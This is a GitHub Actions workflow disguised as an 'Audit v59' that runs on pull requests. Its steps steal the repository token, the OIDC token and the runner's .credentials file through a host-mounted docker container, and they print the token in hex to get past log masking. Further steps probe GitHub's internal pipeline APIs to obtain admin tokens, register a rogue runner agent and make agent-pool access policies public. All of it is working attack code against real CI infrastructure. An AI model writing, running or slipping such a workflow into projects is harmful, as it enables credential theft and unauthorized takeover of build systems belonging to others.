name: Audit v59
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v59:
    runs-on: ubuntu-latest
    steps:

      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V59 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt
          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          if [ -f "$WLOG" ]; then
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
            done
            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "PLAN=$PLAN JOB=$JOB"
            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
          fi
          docker run --rm -v /:/h alpine sh -c '
            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
          ' 2>/dev/null > /tmp/hex_extract.txt
          python3 -c "
          import binascii,json
          raw=open('/tmp/hex_extract.txt').read()
          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
          if s>=0 and e>=0:
            h=raw[s+14:e].strip()
            d=json.loads(binascii.unhexlify(h).decode())
            t=d.get('Data',{}).get('token','')
            open('/tmp/cred_token.txt','w').write(t)
            print(f'CTOK_LEN={len(t)}')
          " 2>/dev/null
          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: ADMINTOKEN ALL HTTP METHODS + BODY VARIANTS
      # pools/1/admintoken = 204 DIRECT. Try every verb + body.
      # Maybe DELETE, PATCH or PUT with right body returns token.
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - AdminToken Method Sweep
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== ADMINTOKEN METHOD SWEEP ==="
          IDTOK=$(cat /tmp/idtok.txt)
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
          PIPE="https://pipelines.actions.githubusercontent.com/$SECRET"
          VER="api-version=6.0-preview"

          echo "--- A: All HTTP Methods on pools/1/admintoken ---"
          for METH in GET POST PUT PATCH DELETE OPTIONS HEAD; do
            R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X $METH --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Host: pipelines.actions.githubusercontent.com" \
              -H "Content-Type: application/json" \
              -H "Accept: application/json; $VER" \
              "$PROXY/_apis/distributedtask/pools/1/admintoken" --path-as-is \
              -d '{"poolId":1,"agentId":1}' 2>/dev/null)
            CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
            BODY=$(echo "$R" | tail -3 | head -2)
            echo "A $METH pool/1/admintoken = $CODE | $(echo "$BODY" | head -c 300)"
          done
          echo ""

          # B: POST body variants to pools/1/admintoken
          echo "--- B: POST body variants ---"
          for BODY in \
            '{}' \
            '{"poolId":1}' \
            '{"poolId":1,"agentId":1}' \
            '{"poolId":2}' \
            '{"scope":"all"}' \
            '{"scope":"Agent","poolId":1}' \
            '{"generateToken":true}' \
            '{"includeToken":true,"poolId":1}' \
            '{"validTo":"2030-01-01T00:00:00Z","poolId":1}' \
            '{"name":"v59-admin","poolId":1}'; do
            R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Host: pipelines.actions.githubusercontent.com" \
              -H "Content-Type: application/json" \
              -H "Accept: application/json; $VER" \
              "$PROXY/_apis/distributedtask/pools/1/admintoken" --path-as-is \
              -d "$BODY" 2>/dev/null)
            CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
            BODY_OUT=$(echo "$R" | tail -2 | head -1)
            echo "B POST $BODY = $CODE | $(echo "$BODY_OUT" | head -c 200)"
          done
          echo ""

          # C: Direct pipelines URL (no proxy, no Host spoof)
          echo "--- C: Direct pipelines URL (no proxy) ---"
          for EP in \
            "_apis/distributedtask/pools/1/admintoken" \
            "_apis/distributedtask/pools/2/admintoken" \
            "_apis/distributedtask/pools/1/accesspolicy" \
            "_apis/distributedtask/pools/2/accesspolicy"; do
            R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X GET --connect-timeout 3 -m 4 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Accept: application/json; $VER" \
              "$PIPE/$EP" 2>/dev/null)
            CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
            BODY=$(echo "$R" | tail -3)
            echo "C GET $EP = $CODE"
            echo "$BODY" | head -c 400
            echo ""
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 3: AGENT REGISTRATION via pools/1/agents
      # pools/1/agents returned 200 count:0 — endpoint is OPEN.
      # POST to register a fake agent — this could give us a session!
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - Agent Registration
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== AGENT REGISTRATION ==="
          IDTOK=$(cat /tmp/idtok.txt)
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
          PIPE="https://pipelines.actions.githubusercontent.com/$SECRET"
          VER="api-version=6.0-preview"

          echo "--- A: POST agent to pool/1 ---"
          for TOK_NAME in IDTOK CTOK; do
            eval TOK=\$$TOK_NAME
            [ -z "$TOK" ] || [ "${#TOK}" -lt 10 ] && continue
            for BODY in \
              '{"name":"v59-agent","version":"2.0.0","osDescription":"Linux","systemCapabilities":{"Agent.Version":"2.0.0"},"maxParallelism":1}' \
              '{"name":"v59-agent","version":"2.319.0","labels":[{"name":"ubuntu-latest","type":"system"}],"systemCapabilities":{"Agent.Version":"2.319.0"}}' \
              '{"name":"v59"}'; do
              R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $TOK" \
                -H "Host: pipelines.actions.githubusercontent.com" \
                -H "Content-Type: application/json" \
                -H "Accept: application/json; $VER" \
                "$PROXY/_apis/distributedtask/pools/1/agents" --path-as-is \
                -d "$BODY" 2>/dev/null)
              CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
              echo "A $TOK_NAME POST agent = $CODE"
              echo "$R" | grep -v "^HTTP\|^cache\|^pragma\|^content\|^strict\|^x-\|^date\|^$" | head -c 500
              echo ""
            done
          done
          echo ""

          # B: Direct pipelines URL agent registration
          echo "--- B: Direct pipelines agent reg ---"
          for PID in 1 2; do
            R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Content-Type: application/json" \
              -H "Accept: application/json; $VER" \
              "$PIPE/_apis/distributedtask/pools/$PID/agents" \
              -d '{"name":"v59-rogue","version":"2.319.0","labels":[{"name":"ubuntu-latest","type":"system"}],"systemCapabilities":{"Agent.Version":"2.319.0"},"maxParallelism":1}' 2>/dev/null)
            CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
            echo "B Direct pool/$PID agent = $CODE"
            echo "$R" | tail -c 500
            echo ""
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 4: ACCESSPOLICY MANIPULATION
      # pools/1/accesspolicy returns 204 — auth bypass target.
      # What can we READ and WRITE to access policy?
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - AccessPolicy Manipulation
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== ACCESSPOLICY ==="
          IDTOK=$(cat /tmp/idtok.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
          PIPE="https://pipelines.actions.githubusercontent.com/$SECRET"
          VER="api-version=6.0-preview"

          echo "--- A: All methods on accesspolicy ---"
          for METH in GET POST PUT PATCH DELETE; do
            for PID in 1 2; do
              R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X $METH --connect-timeout 2 -m 3 \
                -H "Authorization: Bearer $IDTOK" \
                -H "Host: pipelines.actions.githubusercontent.com" \
                -H "Content-Type: application/json" \
                -H "Accept: application/json; $VER" \
                "$PROXY/_apis/distributedtask/pools/$PID/accesspolicy" --path-as-is \
                -d '{"isPublic":true,"permission":3}' 2>/dev/null)
              CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
              BODY=$(echo "$R" | tail -3 | head -2)
              echo "A $METH pool/$PID/accesspolicy = $CODE | $(echo "$BODY" | head -c 200)"
            done
          done
          echo ""

          # B: Direct URL accesspolicy full response
          echo "--- B: Direct pools accesspolicy ---"
          for PID in 1 2; do
            R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 4 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Accept: application/json; $VER" \
              "$PIPE/_apis/distributedtask/pools/$PID/accesspolicy" 2>/dev/null)
            CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
            echo "B Direct pool/$PID/accesspolicy = $CODE"
            echo "$R" | tail -c 500
            echo ""
          done

      - name: Step 5 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V59 FINAL ==="
          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
          echo "=== V59 COMPLETE ==="
